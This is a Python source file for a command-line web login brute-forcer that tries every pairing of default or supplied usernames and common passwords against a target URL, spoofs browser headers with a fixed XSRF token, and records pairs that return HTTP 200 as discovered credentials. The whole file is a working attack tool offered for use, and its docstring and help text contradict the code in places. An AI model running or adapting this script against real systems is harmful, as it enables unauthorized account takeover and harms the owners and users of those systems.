
import requests
import time
import argparse
import logging
import signal
import sys

logging.basicConfig()
logger = logging.getLogger(__name__)
logger.setLevel(logging.ERROR)


class Engine(object):
    user_path = None
    pass_path = None
    target = ''
    userlist = ['root', 'admin', 'ubuntu', 'Administrator']
    passlist = ['password', '123456', 'letmein', 'superman', 'password123']
    credentials = []

    req_time = 0.0
    num_pools = 10

    start_time = 0.0
    end_time = 0.0

    user_identifier = 'j_username'
    pass_identifier = 'j_password'

    def __init__(self, target, userfile=None, req_time=0.0, passfile=None, user_ident=None, pass_ident=None):
        """
        Initialize ssh brute force engine
        :param target: should be an IP address (string)
        :param userfile: string file path to the file with usernames -- one username per line
        :param req_time: time (in seconds) to wait between requests
        :param passfile: string file path to the file with passwords -- one password per line
        :return:
        """
        self.req_time = req_time
        self.target = target
        self.user_path = userfile
        self.pass_path = passfile
        if self.user_path:
            self.userlist = self.load_file(userfile)
        if self.pass_path:
            self.passlist = self.load_file(passfile)
        if user_ident:
            self.user_identifier = user_ident
        if pass_ident:
            self.pass_identifier = pass_ident

        signal.signal(signal.SIGINT, self.signal_handler)

    def load_file(self, filepath):
        """
        Helper function that loads a filepath and reads the contents.
        :param filepath: string filepath
        :return: a list of each line as an item in the list
        """
        data = []
        with open(filepath, 'r') as f:
            data = f.read().splitlines()
        return data

    def execute(self):

        self.start_time = time.time()

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-XSRF-TOKEN': '1e155699-275c-4974-bb0f-7e94606f87ae',
            'Cookie': 'XSRF-TOKEN=1e155699-275c-4974-bb0f-7e94606f87ae',
            'Connection': 'close',
        }

        for user in self.userlist:
            for pw in self.passlist:
                try:
                    data = {
                        self.user_identifier: user,
                        self.pass_identifier: pw,
                    }

                    r = requests.post(self.target, headers=headers, data=data)

                    if r.status_code == 200:
                        creds = '%s:%s' % (user, pw)
                        logger.info('Discovered Credentials: %s' % creds)
                        print('Discovered Credentials: %s' % creds)
                        self.credentials.append(creds)
                    else:
                        logger.info('Failed: %s:%s' % (user, pw))
                        print('Failed: %s:%s' % (user, pw))

                except:
                    raise

                time.sleep(self.req_time)

        self.end_time = time.time()
        total = self.end_time - self.start_time
        logger.debug('\nTotal Execution Time: %s\n' % total)

        print('Discovered credentials: %s' % self.credentials)

    def signal_handler(self, signum, frame):
        print('Caught signal. Exiting.')
        logger.info('\nCaught signal. Exiting.')
        print('Discovered credentials: %s' % self.credentials)
        sys.exit(0)


def main(ip_addr, userfile=None, req_time=0.0, passfile=None, user_ident=None, pass_ident=None):
    if ip_addr == '' or not ip_addr:
        print('No target specified')
        return
    engine = Engine(target=ip_addr, userfile=userfile, req_time=req_time, passfile=passfile,
                    user_ident=user_ident, pass_ident=pass_ident)

    engine.execute()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simple web brute-force script')
    parser.add_argument('ip', help='[Required] The IP/path/api of the target server')
    parser.add_argument('-u', '--userlist', help='Specify a filepath with a list of usernames to try -- one username per line')
    parser.add_argument('-p', '--passlist', help='Specify a filepath with a list of passwords to try -- one password per line')
    parser.add_argument('-t', '--time', help='Set the time between requests (in seconds)')
    parser.add_argument('-U', '--user_ident', help='Specify what the JSON user identifier is: Default is \'username\'')
    parser.add_argument('-P', '--pass_ident', help='Specify what the JSON password identifier is: Default is \'password\'')

    ip_addr = None
    user_filename = None
    pass_filename = None
    req_time = 0.0
    user_ident = None
    pass_ident = None
    args = parser.parse_args()

    if args.ip:
        ip_addr = args.ip
    if args.userlist:
        user_filename = args.userlist
    if args.passlist:
        pass_filename = args.passlist
    if args.time:
        req_time = float(args.time)
    if args.user_ident:
        user_ident = args.user_ident
    if args.pass_ident:
        pass_ident = args.pass_ident
    main(ip_addr, user_filename, req_time, pass_filename, user_ident, pass_ident)


